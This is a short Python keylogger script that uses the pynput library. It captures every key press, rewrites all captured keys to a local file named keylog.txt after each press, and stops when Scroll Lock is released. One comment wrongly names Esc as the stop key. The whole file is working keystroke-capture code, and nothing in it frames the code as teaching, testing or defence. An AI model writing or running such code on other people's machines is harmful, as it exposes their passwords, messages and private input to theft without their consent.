from pynput.keyboard import Key  
from pynput.keyboard import Listener
#Creating the list for keys
keyy = []  
# creating a function that defines what to do on each key press  
def functionPerKey(key):
# appending each pressed key to a list  
    keyy.append(key)  
# writing list to file after each key pressed  
    storeKeysToFile(keyy)  
  
# defining the function to write keys to the log file  
def storeKeysToFile(keys):  
    # creating the keylog.txt file with write mode  
    with open('keylog.txt', 'w') as log:
        # looping through each key present in the list of keys  
        for i in keys:  
            # converting the key to string and removing the quotation marks  
            i = str(i).replace("'", "")
            # writing each key to the keylog.txt file  
            if i == 'Key.space':
                log.write('\n')
                log.write("Key_space" + "\n")
            else:
                log.write(i + ' ')
  
# defining the function to perform operation on each key release  
def onEachKeyRelease(i):
    # In case, the key is "Esc" then stopping the keylogger  
    if i == Key.scroll_lock:  
        return False  
  
with Listener(on_press = functionPerKey,on_release = onEachKeyRelease) as listen:  
    listen.join()  
